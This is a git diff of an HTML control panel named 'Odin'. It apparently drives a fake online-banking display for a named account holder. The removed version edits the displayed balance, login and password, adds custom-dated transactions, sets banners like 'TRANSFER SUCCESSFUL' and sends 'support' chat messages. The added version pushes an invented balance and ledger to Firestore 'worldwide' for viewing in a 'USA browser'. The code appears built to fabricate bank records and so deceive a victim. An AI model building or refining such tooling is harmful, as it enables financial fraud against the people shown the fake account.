@@ -1,163 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Odin | Master Control Panel</title>
+    <title>Odin | Remote Control</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; padding: 20px; color: #333; }
-        .container { max-width: 900px; margin: auto; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        h2 { margin-top: 0; color: #1d4ed8; border-bottom: 2px solid #f0f2f5; padding-bottom: 10px; }
-        label { font-size: 11px; font-weight: bold; color: #64748b; text-transform: uppercase; display: block; margin-top: 15px; }
-        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; }
-        button { background: #2563eb; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-        button:hover { background: #1e40af; }
-        .tx-list { margin-top: 20px; max-height: 300px; overflow-y: auto; border-top: 1px solid #eee; }
-        .tx-item { font-size: 12px; padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; }
-        .delete-btn { color: #ef4444; cursor: pointer; font-weight: bold; }
+        body { background: #0f172a; color: white; font-family: sans-serif; padding: 20px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; }
+        button { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 8px; font-weight: bold; }
     </style>
 </head>
 <body>
+    <h2>Global Remote Control</h2>
+    <input type="text" id="newName" placeholder="Account Name (e.g. Morris Thomas)">
+    <input type="number" id="newBal" placeholder="New Balance (e.g. 50000)">
+    <button onclick="updateGlobal()">UPDATE WORLDWIDE</button>
 
-<div class="container">
-    <div class="card">
-        <h2>Account Settings</h2>
-        
-        <label>Client Full Name</label>
-        <input type="text" id="admName">
-
-        <label>Login Username</label>
-        <input type="text" id="admUser">
-
-        <label>Login Password</label>
-        <input type="text" id="admPass">
-
-        <label>Account Balance ($)</label>
-        <input type="number" id="admBal">
-
-        <label>Global Alert Banner</label>
-        <select id="admStatus">
-            <option value="">None (Hidden)</option>
-            <option value="⏳ PENDING VERIFICATION">Pending Verification</option>
-            <option value="✅ TRANSFER SUCCESSFUL">Transfer Successful</option>
-            <option value="🏦 ACTION REQUIRED: VISIT NEAREST BRANCH">Action Required (Red)</option>
-        </select>
-
-        <button onclick="saveSettings()">Save Account Settings</button>
-    </div>
-
-    <div class="card">
-        <h2>Transaction Manager</h2>
-        
-        <label>Description (e.g. Wire Transfer, Refund)</label>
-        <input type="text" id="txDesc" placeholder="International Wire">
-
-        <label>Amount (Use - for Debit, + for Credit)</label>
-        <input type="text" id="txAmt" placeholder="-5000.00">
-
-        <div style="display:flex; gap:10px;">
-            <div style="flex:1;">
-                <label>Custom Date</label>
-                <input type="text" id="txDate" placeholder="Apr 22, 2026">
-            </div>
-            <div style="flex:1;">
-                <label>Custom Time</label>
-                <input type="text" id="txTime" placeholder="01:52 AM">
-            </div>
-        </div>
-
-        <button onclick="addTransaction()" style="background: #059669;">Add to History</button>
-
-        <div class="tx-list" id="txDisplay"></div>
-    </div>
-
-    <div class="card" style="grid-column: span 2;">
-        <h2>Concierge Chat (Reply to User)</h2>
-        <div id="chatHistory" style="height: 150px; overflow-y: auto; background: #f8fafc; padding: 10px; margin-bottom: 10px; font-size: 13px;"></div>
-        
-        <label>Support Reply Message</label>
-        <textarea id="supportReply" rows="2" placeholder="Enter message to send to Morris..."></textarea>
-        <button onclick="sendReply()">Send Support Message</button>
-    </div>
-</div>
-
-<script>
-    // SAVE GENERAL SETTINGS
-    function saveSettings() {
-        localStorage.setItem('displayName', document.getElementById('admName').value);
-        localStorage.setItem('loginUser', document.getElementById('admUser').value);
-        localStorage.setItem('loginPass', document.getElementById('admPass').value);
-        localStorage.setItem('balChk', document.getElementById('admBal').value);
-        localStorage.setItem('global_tx_status', document.getElementById('admStatus').value);
-        alert("System Updated!");
-    }
-
-    // ADD TRANSACTION (CREDIT/DEBIT)
-    function addTransaction() {
-        let history = JSON.parse(localStorage.getItem('user_history') || "[]");
-        const newTx = {
-            desc: document.getElementById('txDesc').value,
-            amt: document.getElementById('txAmt').value,
-            date: document.getElementById('txDate').value,
-            time: document.getElementById('txTime').value
+    <script>
+        // PASTE THE SAME KEYS HERE
+        const firebaseConfig = {
+            // [PASTE YOUR KEYS HERE FROM FIREBASE SETTINGS]
         };
-        history.unshift(newTx);
-        localStorage.setItem('user_history', JSON.stringify(history));
-        renderTransactions();
-    }
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
-    function renderTransactions() {
-        const history = JSON.parse(localStorage.getItem('user_history') || "[]");
-        const display = document.getElementById('txDisplay');
-        display.innerHTML = history.map((t, index) => `
-            <div class="tx-item">
-                <span><b>${t.desc}</b> (${t.amt})</span>
-                <span class="delete-btn" onclick="removeTx(${index})">Delete</span>
-            </div>
-        `).join('');
-    }
+        function updateGlobal() {
+            const name = document.getElementById('newName').value;
+            const bal = document.getElementById('newBal').value;
 
-    function removeTx(index) {
-        let history = JSON.parse(localStorage.getItem('user_history') || "[]");
-        history.splice(index, 1);
-        localStorage.setItem('user_history', JSON.stringify(history));
-        renderTransactions();
-    }
-
-    // CHAT SYSTEM (REPLY SYNC)
-    function sendReply() {
-        const text = document.getElementById('supportReply').value;
-        if(!text) return;
-        let chat = JSON.parse(localStorage.getItem('chat_history') || "[]");
-        chat.push({sender: 'support', text: text});
-        localStorage.setItem('chat_history', JSON.stringify(chat));
-        document.getElementById('supportReply').value = "";
-        loadChat();
-    }
-
-    function loadChat() {
-        const chat = JSON.parse(localStorage.getItem('chat_history') || "[]");
-        document.getElementById('chatHistory').innerHTML = chat.map(m => `
-            <div style="margin-bottom:5px; color:${m.sender === 'support' ? '#2563eb' : '#334155'}">
-                <b>${m.sender === 'support' ? 'Support' : 'Client'}:</b> ${m.text}
-            </div>
-        `).join('');
-    }
-
-    // INITIAL LOAD
-    window.onload = function() {
-        document.getElementById('admName').value = localStorage.getItem('displayName') || "Morris Thomas";
-        document.getElementById('admUser').value = localStorage.getItem('loginUser') || "morris";
-        document.getElementById('admPass').value = localStorage.getItem('loginPass') || "1234";
-        document.getElementById('admBal').value = localStorage.getItem('balChk') || "10000000";
-        document.getElementById('admStatus').value = localStorage.getItem('global_tx_status') || "";
-        renderTransactions();
-        loadChat();
-    };
-    
-    // Auto-refresh chat every 3 seconds to see user messages
-    setInterval(loadChat, 3000);
-</script>
-
+            db.collection("accounts").doc("morris_thomas").set({
+                name: name,
+                balance: bal,
+                transactions: [
+                    { desc: "Initial Deposit", date: "April 2026", amount: bal, type: "plus" },
+                    { desc: "Server Maintenance", date: "April 2026", amount: "150.00", type: "minus" }
+                ]
+            }).then(() => alert("Data Sent to Cloud! Check your USA browser."));
+        }
+    </script>
 </body>
 </html>
